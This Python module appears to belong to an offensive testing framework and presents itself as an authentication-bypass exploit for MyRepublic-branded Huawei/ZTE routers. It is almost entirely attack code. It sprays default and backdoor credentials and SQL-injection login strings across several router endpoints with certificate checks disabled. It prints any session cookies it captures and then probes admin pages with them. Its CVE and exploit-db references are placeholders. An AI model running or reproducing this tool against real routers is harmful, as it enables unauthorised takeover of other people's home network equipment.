#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "MyRepublic Router Authentication Bypass",
    "description": "Exploits authentication bypass vulnerability in MyRepublic branded routers (Huawei/ZTEGPON)",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "references": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-XXXX",
        "https://www.exploit-db.com/exploits/XXXXX"
    ],
    "platform": "multi",
    "rank": "excellent",
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.1.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False,
        "default": "80"
    },
    "SSL": {
        "description": "Use HTTPS",
        "required": False,
        "default": "false"
    },
    "USERNAME": {
        "description": "Username for login (if known)",
        "required": False,
        "default": "admin"
    },
    "PASSWORD": {
        "description": "Password for login (if known)", 
        "required": False,
        "default": "admin"
    }
}

def run(session, options):
    import requests
    import urllib3
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    use_ssl = options.get("SSL", "false").lower() == "true"
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    
    protocol = "https" if use_ssl else "http"
    base_url = f"{protocol}://{rhost}:{rport}"
    
    console.print(Panel.fit(
        f"[bold red]MyRepublic Router Authentication Bypass Exploit[/bold red]\n"
        f"Target: {base_url}\n"
        f"Creds: {username}:{password}",
        title="Exploit Information"
    ))
    
    # Common MyRepublic router endpoints
    endpoints = [
        "/login.html",
        "/api/system/user_login",
        "/cgi-bin/luci/admin/status",
        "/cgi-bin/luci/",
        "/html/login.html",
        "/api/user/login",
        "/cgi-bin/login.cgi",
        "/webpages/login.html"
    ]
    
    # Authentication bypass payloads
    bypass_payloads = [
        {"username": "admin", "password": "admin", "submit": "Login"},
        {"user": "admin", "pass": "admin", "action": "login"},
        {"UserName": "admin", "Password": "admin", "Login": "Submit"},
        {"userid": "admin", "password": "admin"},
        {"user_name": "admin", "user_password": "admin"},
        # Common backdoor credentials
        {"username": "admin", "password": ""},
        {"username": "admin", "password": "password"},
        {"username": "support", "password": "support"},
        {"username": "user", "password": "user"},
        # SQL Injection attempts
        {"username": "admin' or '1'='1", "password": "anything"},
        {"username": "admin' --", "password": ""},
        {"username": "admin' #", "password": ""}
    ]
    
    successful_logins = []
    
    for endpoint in endpoints:
        console.print(f"\n[bold yellow]Trying endpoint: {endpoint}[/bold yellow]")
        
        for i, payload in enumerate(bypass_payloads):
            try:
                url = f"{base_url}{endpoint}"
                
                # Try POST request
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                response = requests.post(
                    url,
                    data=payload,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                
                # Check for success indicators
                success = False
                success_indicators = [
                    response.status_code == 200 and "success" in response.text.lower(),
                    response.status_code == 200 and "true" in response.text.lower(),
                    response.status_code == 200 and "welcome" in response.text.lower(),
                    response.status_code == 302,  # Redirect often means success
                    "set-cookie" in response.headers and "session" in response.headers.get("set-cookie", "").lower(),
                    response.status_code == 200 and "status" in response.text.lower() and "login" not in response.text.lower()
                ]
                
                if any(success_indicators):
                    console.print(f"[green]✓ SUCCESS: {endpoint} with payload {i+1}[/green]")
                    console.print(f"   Response: {response.status_code} - Length: {len(response.text)}")
                    
                    successful_logins.append({
                        "endpoint": endpoint,
                        "payload": payload,
                        "status_code": response.status_code,
                        "headers": dict(response.headers),
                        "cookies": dict(response.cookies),
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    })
                    
                    # Save session cookies
                    if response.cookies:
                        console.print("[bold green]Session Cookies Obtained:[/bold green]")
                        for cookie in response.cookies:
                            console.print(f"  {cookie.name} = {cookie.value}")
                
                else:
                    console.print(f"[dim]  Attempt {i+1}: {response.status_code}[/dim]")
                    
            except requests.exceptions.RequestException as e:
                console.print(f"[red]  Error: {str(e)}[/red]")
                continue
    
    # Display results
    if successful_logins:
        console.print(Panel.fit(
            "[bold green]AUTHENTICATION BYPASS SUCCESSFUL![/bold green]",
            style="green"
        ))
        
        table = Table(title="Successful Login Attempts")
        table.add_column("Endpoint", style="cyan")
        table.add_column("Payload", style="yellow")
        table.add_column("Status", style="green")
        table.add_column("Cookies", style="white")
        
        for login in successful_logins:
            payload_str = str(login["payload"])[:50] + "..." if len(str(login["payload"])) > 50 else str(login["payload"])
            cookies_str = str(len(login.get("cookies", {}))) + " cookies"
            
            table.add_row(
                login["endpoint"],
                payload_str,
                str(login["status_code"]),
                cookies_str
            )
        
        console.print(table)
        
        # Try to access admin panel with obtained session
        console.print("\n[bold]Attempting to access admin panel...[/bold]")
        admin_endpoints = [
            "/", "/index.html", "/admin/", "/cgi-bin/luci/admin/",
            "/status.html", "/diagnostics.html", "/wireless.html"
        ]
        
        for login in successful_logins:
            if login.get("cookies"):
                for admin_ep in admin_endpoints:
                    try:
                        url = f"{base_url}{admin_ep}"
                        response = requests.get(
                            url,
                            cookies=login["cookies"],
                            verify=False,
                            timeout=10
                        )
                        
                        if response.status_code == 200 and "login" not in response.text.lower():
                            console.print(f"[green]✓ Admin access: {admin_ep}[/green]")
                            break
                    except:
                        continue
    
    else:
        console.print(Panel.fit(
            "[bold red]No successful authentication bypass attempts[/bold red]",
            style="red"
        ))
